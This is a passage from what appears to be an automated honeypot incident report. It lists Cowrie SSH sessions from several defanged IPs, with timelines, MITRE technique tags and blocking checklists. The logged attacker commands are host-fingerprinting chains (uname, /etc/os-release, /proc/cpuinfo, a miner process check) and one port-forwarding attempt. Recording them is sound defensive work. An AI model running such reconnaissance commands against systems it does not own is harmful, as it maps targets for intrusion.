| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:48:15` | `cowrie.session.connect` |
| `2026-07-04 21:48:16` | `cowrie.client.version` |
| `2026-07-04 21:48:16` | `cowrie.client.kex` |
| `2026-07-04 21:48:22` | `cowrie.login.success` |
| `2026-07-04 21:48:26` | `cowrie.session.params` |
| `2026-07-04 21:48:26` | `cowrie.command.input` |
| `2026-07-04 21:48:27` | `cowrie.log.closed` |
| `2026-07-04 21:48:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed8dc30e43ed

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 21:59 |
| **Last Seen** | 2026-07-04 21:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:59:43` | `cowrie.session.connect` |
| `2026-07-04 21:59:43` | `cowrie.client.version` |
| `2026-07-04 21:59:43` | `cowrie.client.kex` |
| `2026-07-04 21:59:43` | `cowrie.login.success` |
| `2026-07-04 21:59:44` | `cowrie.session.params` |
| `2026-07-04 21:59:44` | `cowrie.command.input` |
| `2026-07-04 21:59:44` | `cowrie.log.closed` |
| `2026-07-04 21:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68fcfe63638f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 22:00 |
| **Last Seen** | 2026-07-04 22:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:00:09` | `cowrie.session.connect` |
| `2026-07-04 22:00:10` | `cowrie.client.version` |
| `2026-07-04 22:00:10` | `cowrie.client.kex` |
| `2026-07-04 22:00:16` | `cowrie.login.success` |
| `2026-07-04 22:00:20` | `cowrie.session.params` |
| `2026-07-04 22:00:20` | `cowrie.command.input` |
| `2026-07-04 22:00:21` | `cowrie.log.closed` |
| `2026-07-04 22:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-befbeca28e0c

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]19` |
| **First Seen** | 2026-07-04 22:06 |
| **Last Seen** | 2026-07-04 22:07 |
| **Session Duration** | 16s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:06:58` | `cowrie.session.connect` |
| `2026-07-04 22:06:58` | `cowrie.client.version` |
| `2026-07-04 22:06:58` | `cowrie.client.kex` |
| `2026-07-04 22:06:59` | `cowrie.client.fingerprint` |
| `2026-07-04 22:06:59` | `cowrie.login.failed` |
| `2026-07-04 22:07:00` | `cowrie.login.success` |
| `2026-07-04 22:07:14` | `cowrie.direct-tcpip.request` |
| `2026-07-04 22:07:14` | `cowrie.direct-tcpip.ja4` |
| `2026-07-04 22:07:14` | `cowrie.direct-tcpip.data` |
| `2026-07-04 22:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]19` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db347fdccdf1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 22:12 |
| **Last Seen** | 2026-07-04 22:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:12:01` | `cowrie.session.connect` |
| `2026-07-04 22:12:02` | `cowrie.client.version` |
| `2026-07-04 22:12:02` | `cowrie.client.kex` |
| `2026-07-04 22:12:09` | `cowrie.login.success` |
| `2026-07-04 22:12:12` | `cowrie.session.params` |
| `2026-07-04 22:12:12` | `cowrie.command.input` |
| `2026-07-04 22:12:15` | `cowrie.log.closed` |
| `2026-07-04 22:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7486bcb74dd1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 22:23 |
| **Last Seen** | 2026-07-04 22:23 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:23:43` | `cowrie.session.connect` |
| `2026-07-04 22:23:44` | `cowrie.client.version` |
| `2026-07-04 22:23:44` | `cowrie.client.kex` |
| `2026-07-04 22:23:50` | `cowrie.login.success` |
| `2026-07-04 22:23:53` | `cowrie.session.params` |
| `2026-07-04 22:23:53` | `cowrie.command.input` |
| `2026-07-04 22:23:55` | `cowrie.log.closed` |
| `2026-07-04 22:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af5156b00d7e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:26 |
| **Last Seen** | 2026-07-04 22:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:26:20` | `cowrie.session.connect` |
| `2026-07-04 22:26:20` | `cowrie.client.version` |
| `2026-07-04 22:26:20` | `cowrie.client.kex` |
| `2026-07-04 22:26:22` | `cowrie.login.success` |
| `2026-07-04 22:26:24` | `cowrie.session.params` |
| `2026-07-04 22:26:24` | `cowrie.command.input` |
| `2026-07-04 22:26:24` | `cowrie.command.input` |
| `2026-07-04 22:26:24` | `cowrie.command.input` |
| `2026-07-04 22:26:24` | `cowrie.command.input` |
| `2026-07-04 22:26:24` | `cowrie.command.input` |
| `2026-07-04 22:26:24` | `cowrie.command.success` |
| `2026-07-04 22:26:24` | `cowrie.command.input` |
| `2026-07-04 22:26:24` | `cowrie.command.input` |
| `2026-07-04 22:26:24` | `cowrie.command.input` |
| `2026-07-04 22:26:24` | `cowrie.command.input` |
| `2026-07-04 22:26:24` | `cowrie.log.closed` |
| `2026-07-04 22:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-025c749644eb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:28 |
| **Last Seen** | 2026-07-04 22:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:28:15` | `cowrie.session.connect` |
| `2026-07-04 22:28:15` | `cowrie.client.version` |
| `2026-07-04 22:28:15` | `cowrie.client.kex` |
| `2026-07-04 22:28:17` | `cowrie.login.success` |
| `2026-07-04 22:28:19` | `cowrie.session.params` |
| `2026-07-04 22:28:19` | `cowrie.command.input` |
| `2026-07-04 22:28:19` | `cowrie.command.input` |
| `2026-07-04 22:28:19` | `cowrie.command.input` |
| `2026-07-04 22:28:19` | `cowrie.command.input` |
| `2026-07-04 22:28:19` | `cowrie.command.input` |
| `2026-07-04 22:28:19` | `cowrie.command.success` |
| `2026-07-04 22:28:19` | `cowrie.command.input` |
| `2026-07-04 22:28:19` | `cowrie.command.input` |
| `2026-07-04 22:28:19` | `cowrie.command.input` |
| `2026-07-04 22:28:19` | `cowrie.command.input` |
| `2026-07-04 22:28:20` | `cowrie.log.closed` |
| `2026-07-04 22:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d87671613f42

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:30 |
| **Last Seen** | 2026-07-04 22:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:30:11` | `cowrie.session.connect` |
| `2026-07-04 22:30:12` | `cowrie.client.version` |
| `2026-07-04 22:30:12` | `cowrie.client.kex` |
| `2026-07-04 22:30:14` | `cowrie.login.success` |
| `2026-07-04 22:30:16` | `cowrie.session.params` |
| `2026-07-04 22:30:16` | `cowrie.command.input` |
| `2026-07-04 22:30:16` | `cowrie.command.input` |
| `2026-07-04 22:30:16` | `cowrie.command.input` |
| `2026-07-04 22:30:16` | `cowrie.command.input` |
| `2026-07-04 22:30:16` | `cowrie.command.input` |
| `2026-07-04 22:30:16` | `cowrie.command.success` |
| `2026-07-04 22:30:16` | `cowrie.command.input` |
| `2026-07-04 22:30:16` | `cowrie.command.input` |
| `2026-07-04 22:30:16` | `cowrie.command.input` |
| `2026-07-04 22:30:16` | `cowrie.command.input` |
| `2026-07-04 22:30:17` | `cowrie.log.closed` |
| `2026-07-04 22:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f525984117

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:32 |
| **Last Seen** | 2026-07-04 22:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:32:08` | `cowrie.session.connect` |
| `2026-07-04 22:32:09` | `cowrie.client.version` |
| `2026-07-04 22:32:09` | `cowrie.client.kex` |
| `2026-07-04 22:32:13` | `cowrie.login.success` |
| `2026-07-04 22:32:16` | `cowrie.session.params` |
| `2026-07-04 22:32:16` | `cowrie.command.input` |
| `2026-07-04 22:32:16` | `cowrie.command.input` |
| `2026-07-04 22:32:16` | `cowrie.command.input` |
| `2026-07-04 22:32:16` | `cowrie.command.input` |
| `2026-07-04 22:32:16` | `cowrie.command.input` |
| `2026-07-04 22:32:16` | `cowrie.command.success` |
| `2026-07-04 22:32:16` | `cowrie.command.input` |
| `2026-07-04 22:32:16` | `cowrie.command.input` |
| `2026-07-04 22:32:16` | `cowrie.command.input` |
| `2026-07-04 22:32:16` | `cowrie.command.input` |
| `2026-07-04 22:32:18` | `cowrie.log.closed` |
| `2026-07-04 22:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-992c70662f85

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:34 |
| **Last Seen** | 2026-07-04 22:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:34:01` | `cowrie.session.connect` |
| `2026-07-04 22:34:03` | `cowrie.client.version` |
| `2026-07-04 22:34:03` | `cowrie.client.kex` |
| `2026-07-04 22:34:08` | `cowrie.login.success` |
| `2026-07-04 22:34:11` | `cowrie.session.params` |
| `2026-07-04 22:34:11` | `cowrie.command.input` |
| `2026-07-04 22:34:11` | `cowrie.command.input` |
| `2026-07-04 22:34:11` | `cowrie.command.input` |
| `2026-07-04 22:34:11` | `cowrie.command.input` |
| `2026-07-04 22:34:11` | `cowrie.command.input` |
| `2026-07-04 22:34:11` | `cowrie.command.success` |
| `2026-07-04 22:34:11` | `cowrie.command.input` |
| `2026-07-04 22:34:11` | `cowrie.command.input` |
| `2026-07-04 22:34:11` | `cowrie.command.input` |
| `2026-07-04 22:34:11` | `cowrie.command.input` |
| `2026-07-04 22:34:12` | `cowrie.log.closed` |
| `2026-07-04 22:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-940eb4cdce0b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 22:35 |
| **Last Seen** | 2026-07-04 22:35 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:35:09` | `cowrie.session.connect` |
| `2026-07-04 22:35:10` | `cowrie.client.version` |
| `2026-07-04 22:35:10` | `cowrie.client.kex` |
| `2026-07-04 22:35:17` | `cowrie.login.success` |
| `2026-07-04 22:35:20` | `cowrie.session.params` |
| `2026-07-04 22:35:20` | `cowrie.command.input` |
| `2026-07-04 22:35:22` | `cowrie.log.closed` |
| `2026-07-04 22:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f210ffc5ca16

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 22:36 |
| **Last Seen** | 2026-07-04 22:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:36:24` | `cowrie.session.connect` |
| `2026-07-04 22:36:24` | `cowrie.client.version` |
| `2026-07-04 22:36:24` | `cowrie.client.kex` |
| `2026-07-04 22:36:24` | `cowrie.login.success` |
| `2026-07-04 22:36:25` | `cowrie.session.params` |
| `2026-07-04 22:36:25` | `cowrie.command.input` |
| `2026-07-04 22:36:25` | `cowrie.log.closed` |
| `2026-07-04 22:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ad24fc63d3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:37 |
| **Last Seen** | 2026-07-04 22:38 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:37:54` | `cowrie.session.connect` |
| `2026-07-04 22:37:56` | `cowrie.client.version` |
| `2026-07-04 22:37:56` | `cowrie.client.kex` |
| `2026-07-04 22:38:03` | `cowrie.login.success` |
| `2026-07-04 22:38:06` | `cowrie.session.params` |
| `2026-07-04 22:38:06` | `cowrie.command.input` |
| `2026-07-04 22:38:06` | `cowrie.command.input` |
| `2026-07-04 22:38:06` | `cowrie.command.input` |
| `2026-07-04 22:38:06` | `cowrie.command.input` |
| `2026-07-04 22:38:06` | `cowrie.command.input` |
| `2026-07-04 22:38:06` | `cowrie.command.success` |
| `2026-07-04 22:38:06` | `cowrie.command.input` |
| `2026-07-04 22:38:06` | `cowrie.command.input` |
| `2026-07-04 22:38:06` | `cowrie.command.input` |
| `2026-07-04 22:38:06` | `cowrie.command.input` |
| `2026-07-04 22:38:08` | `cowrie.log.closed` |
| `2026-07-04 22:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2200e00a2304

| Field | Detail |
|---|---|
| **Source IP** | `45.15.226[.]44` |
| **First Seen** | 2026-07-04 22:39 |
| **Last Seen** | 2026-07-04 22:40 |
| **Session Duration** | 75s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:39:34` | `cowrie.session.connect` |
| `2026-07-04 22:39:34` | `cowrie.client.version` |
| `2026-07-04 22:39:34` | `cowrie.client.kex` |
| `2026-07-04 22:39:36` | `cowrie.login.failed` |
| `2026-07-04 22:39:37` | `cowrie.login.success` |
| `2026-07-04 22:39:38` | `cowrie.session.params` |
| `2026-07-04 22:39:38` | `cowrie.command.input` |
| `2026-07-04 22:39:38` | `cowrie.command.failed` |
| `2026-07-04 22:39:38` | `cowrie.log.closed` |
| `2026-07-04 22:39:39` | `cowrie.session.params` |
| `2026-07-04 22:39:39` | `cowrie.command.input` |
| `2026-07-04 22:39:40` | `cowrie.log.closed` |
| `2026-07-04 22:39:41` | `cowrie.session.params` |
| `2026-07-04 22:39:41` | `cowrie.command.input` |
| `2026-07-04 22:39:41` | `cowrie.log.closed` |
| `2026-07-04 22:39:42` | `cowrie.session.params` |
| `2026-07-04 22:39:42` | `cowrie.command.input` |
| `2026-07-04 22:39:42` | `cowrie.log.closed` |
| `2026-07-04 22:39:43` | `cowrie.session.params` |
| `2026-07-04 22:39:43` | `cowrie.command.input` |
| `2026-07-04 22:39:43` | `cowrie.log.closed` |
| `2026-07-04 22:39:44` | `cowrie.session.params` |
| `2026-07-04 22:39:44` | `cowrie.command.input` |
| `2026-07-04 22:39:44` | `cowrie.log.closed` |
| `2026-07-04 22:39:45` | `cowrie.session.params` |
| `2026-07-04 22:39:45` | `cowrie.command.input` |
| `2026-07-04 22:39:45` | `cowrie.log.closed` |
| `2026-07-04 22:39:46` | `cowrie.session.params` |
| `2026-07-04 22:39:46` | `cowrie.command.input` |
| `2026-07-04 22:39:47` | `cowrie.log.closed` |
| `2026-07-04 22:39:48` | `cowrie.session.params` |
| `2026-07-04 22:39:48` | `cowrie.command.input` |
| `2026-07-04 22:39:48` | `cowrie.log.closed` |
| `2026-07-04 22:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.15.226[.]44` to AbuseIPDB if not already reported
- [ ] Block `45.15.226[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d4a558e277

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:39 |
| **Last Seen** | 2026-07-04 22:39 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:39:42` | `cowrie.session.connect` |
| `2026-07-04 22:39:43` | `cowrie.client.version` |
| `2026-07-04 22:39:43` | `cowrie.client.kex` |
| `2026-07-04 22:39:50` | `cowrie.login.success` |
| `2026-07-04 22:39:54` | `cowrie.session.params` |
| `2026-07-04 22:39:54` | `cowrie.command.input` |
| `2026-07-04 22:39:54` | `cowrie.command.input` |
| `2026-07-04 22:39:54` | `cowrie.command.input` |
| `2026-07-04 22:39:54` | `cowrie.command.input` |
| `2026-07-04 22:39:54` | `cowrie.command.input` |
| `2026-07-04 22:39:54` | `cowrie.command.success` |
| `2026-07-04 22:39:54` | `cowrie.command.input` |
| `2026-07-04 22:39:54` | `cowrie.command.input` |
| `2026-07-04 22:39:54` | `cowrie.command.input` |
| `2026-07-04 22:39:54` | `cowrie.command.input` |
| `2026-07-04 22:39:56` | `cowrie.log.closed` |
| `2026-07-04 22:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa4040ee53d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:41 |
| **Last Seen** | 2026-07-04 22:41 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
